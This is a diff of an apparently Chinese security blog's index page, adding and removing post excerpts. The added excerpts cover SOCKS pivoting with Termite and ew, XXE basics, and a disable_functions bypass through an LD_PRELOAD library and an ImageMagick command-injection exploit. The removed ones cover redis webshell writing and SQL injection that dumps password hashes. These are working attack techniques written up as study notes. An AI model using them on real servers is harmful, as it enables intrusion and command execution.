@@ -117,6 +117,344 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2018/02/03/termite-socks.html" >Termite代理工具</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2018-02-03  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p>
+<p>正向socks v5服务器</p>
+<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>以上面这个文章作为例子，来说下对应的转发与代理</p>
+<p>如果目标有一个外网IP：</p>
+<p>ew来说建立socks代理服务：</p>
+<p><code>ew -s ssocksd -l 8888</code></p>
+<p>Termite:</p>
+<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
+admin_exe -c [tartet_ip] -p 8888
+然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
+goto 1
+socks 1080
+此时VPS上面的1080就架设了一个服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="反弹socks服务器"><a href="#反弹socks服务器" class="headerlink" title="反弹socks服务器"></a>反弹socks服务器</h2><p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p>
+	
+
+	</div>
+  <a type="button" href="/2018/02/03/termite-socks.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p>
+<p>正向socks v5服务器</p>
+<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>以上面这个文章作为例子，来说下对应的转发与代理</p>
+<p>如果目标有一个外网IP：</p>
+<p>ew来说建立socks代理服务：</p>
+<p><code>ew -s ssocksd -l 8888</code></p>
+<p>Termite:</p>
+<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
+admin_exe -c [tartet_ip] -p 8888
+然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
+goto 1
+socks 1080
+此时VPS上面的1080就架设了一个服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="反弹socks服务器"><a href="#反弹socks服务器" class="headerlink" title="反弹socks服务器"></a>反弹socks服务器</h2><p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p>
+	
+	</div>
+  <a type="button" href="/2018/02/03/termite-socks.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2018/02/02/xxe.html" >XXE学习笔记</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2018-02-02  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>XML基础：</p>
+<p>XML文档结构：</p>
+<pre class="line-numbers language-none"><code class="language-none">XML声明
+&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+
+DTD文档类型定义
+&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;
+]]]
+
+
+文档元素
+&lt;note&gt;
+&lt;to&gt;Dave&lt;&#x2F;to&gt;
+&lt;from&gt;Tom&lt;&#x2F;from&gt;
+&lt;head&gt;Reminder&lt;&#x2F;head&gt;
+&lt;body&gt;You are a good man&lt;&#x2F;body&gt;
+&lt;&#x2F;note&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。</p>
+<pre class="line-numbers language-none"><code class="language-none">内部声明DTD：
+
+&lt;!DOCTYPE 跟元素 [元素声明］&gt;
+
+引用外部DTD:
+
+&lt;!DOCTYPE 根元素  SYSTEM &quot;文件名&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>DTD文档中很多关键字如下: </p>
+<ul>
+<li>DOCTYPE(DTD的声明）</li>
+<li>ENTITY （实体的声明）</li>
+<li>SYSTEM、PUBLIC （外部资源申请） </li>
+</ul>
+<p>###实体</p>
+<p>实体可以理解为变量，必须在DTD定义声明，可以在文档中的其它位置引用该变量的值。<br>实体按类型主要分以下四种:</p>
+<ul>
+<li>内置实体（Built-in entities)</li>
+<li>字符实体（Character entities)</li>
+<li>通用实体（General entities）</li>
+<li>参数实体 (Parameter entities）</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2018/02/02/xxe.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>XML基础：</p>
+<p>XML文档结构：</p>
+<pre class="line-numbers language-none"><code class="language-none">XML声明
+&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+
+DTD文档类型定义
+&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;
+]]]
+
+
+文档元素
+&lt;note&gt;
+&lt;to&gt;Dave&lt;&#x2F;to&gt;
+&lt;from&gt;Tom&lt;&#x2F;from&gt;
+&lt;head&gt;Reminder&lt;&#x2F;head&gt;
+&lt;body&gt;You are a good man&lt;&#x2F;body&gt;
+&lt;&#x2F;note&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。</p>
+<pre class="line-numbers language-none"><code class="language-none">内部声明DTD：
+
+&lt;!DOCTYPE 跟元素 [元素声明］&gt;
+
+引用外部DTD:
+
+&lt;!DOCTYPE 根元素  SYSTEM &quot;文件名&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>DTD文档中很多关键字如下: </p>
+<ul>
+<li>DOCTYPE(DTD的声明）</li>
+<li>ENTITY （实体的声明）</li>
+<li>SYSTEM、PUBLIC （外部资源申请） </li>
+</ul>
+<p>###实体</p>
+<p>实体可以理解为变量，必须在DTD定义声明，可以在文档中的其它位置引用该变量的值。<br>实体按类型主要分以下四种:</p>
+<ul>
+<li>内置实体（Built-in entities)</li>
+<li>字符实体（Character entities)</li>
+<li>通用实体（General entities）</li>
+<li>参数实体 (Parameter entities）</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2018/02/02/xxe.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/12/12/bypass-disabled-functions.html" >bypass disable functions</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-12-12  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() &#123;
+system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
+&#125;
+int geteuid() &#123;
+if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
+unsetenv(&quot;LD_PRELOAD&quot;);
+payload();
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
+putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
+mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p> 使用方法：</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
+gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
+<p>====<br>2018.8.22:</p>
+<p>使用imageMagick 绕过:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
+
+$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
+if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
+    $command &#x3D; &#39;id&#39;;
+&#125;
+
+$exploit &#x3D; &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
+pop graphic-context
+EOF;
+
+file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
+$thumb &#x3D; new Imagick();
+$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
+$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+unlink(&quot;KKKK.mvg&quot;);
+unlink(&quot;KKKK.png&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面的比较老，最新的imagemagic漏洞:</p>
+	
+
+	</div>
+  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() &#123;
+system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
+&#125;
+int geteuid() &#123;
+if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
+unsetenv(&quot;LD_PRELOAD&quot;);
+payload();
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
+putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
+mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p> 使用方法：</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
+gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
+<p>====<br>2018.8.22:</p>
+<p>使用imageMagick 绕过:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
+
+$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
+if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
+    $command &#x3D; &#39;id&#39;;
+&#125;
+
+$exploit &#x3D; &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
+pop graphic-context
+EOF;
+
+file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
+$thumb &#x3D; new Imagick();
+$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
+$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+unlink(&quot;KKKK.mvg&quot;);
+unlink(&quot;KKKK.png&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面的比较老，最新的imagemagic漏洞:</p>
+	
+	</div>
+  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/12/11/producer-consumer.html" >生产者消费者模型</a>
 		</h3>
 		</div>
@@ -615,460 +953,6 @@ latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/12/05/redis-crontab.html" >redis hacker</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-12-05  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Orange在BH大会的paper上面这么说的:</p>
-<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
-  HTTP based protocol:
-  	Elastic, CouchDB, Mongodb, Docker
-  
-  Text-based protocol:
-    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
-<ul>
-<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
-<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
-<li>然后再正常使用redis来攻击</li>
-</ul>
-<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
-<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
-redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
-redis-cli -h 127.0.0.1 config set dbfilename shell.php
-redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
-redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>然后得到的数据流如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">*1\r
-$8\r
-flushall\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$3\r
-dir\r
-$8\r
-&#x2F;var&#x2F;www\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$10\r
-dbfilename\r
-$9\r
-shell.php\r
-*3\r
-$3\r
-set\r
-$3\r
-web\r
-$18\r
-&lt;?php phpinfo();?&gt;\r
-*1\r
-$4\r
-save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Orange在BH大会的paper上面这么说的:</p>
-<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
-  HTTP based protocol:
-  	Elastic, CouchDB, Mongodb, Docker
-  
-  Text-based protocol:
-    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
-<ul>
-<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
-<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
-<li>然后再正常使用redis来攻击</li>
-</ul>
-<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
-<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
-redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
-redis-cli -h 127.0.0.1 config set dbfilename shell.php
-redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
-redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>然后得到的数据流如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">*1\r
-$8\r
-flushall\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$3\r
-dir\r
-$8\r
-&#x2F;var&#x2F;www\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$10\r
-dbfilename\r
-$9\r
-shell.php\r
-*3\r
-$3\r
-set\r
-$3\r
-web\r
-$18\r
-&lt;?php phpinfo();?&gt;\r
-*1\r
-$4\r
-save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/11/28/sql-bypass-unknown.html" >SQL注入绕过未知字段名的技巧</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-11-28  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/</a> </p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">---+---+---+</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">---+---+---+</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">---+---+---+</span>
-<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
-<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
-<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">-------+</span>
-<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">-------+</span>
-<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">-------+</span>
-<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
-<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
-<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
-<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
-<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>
-
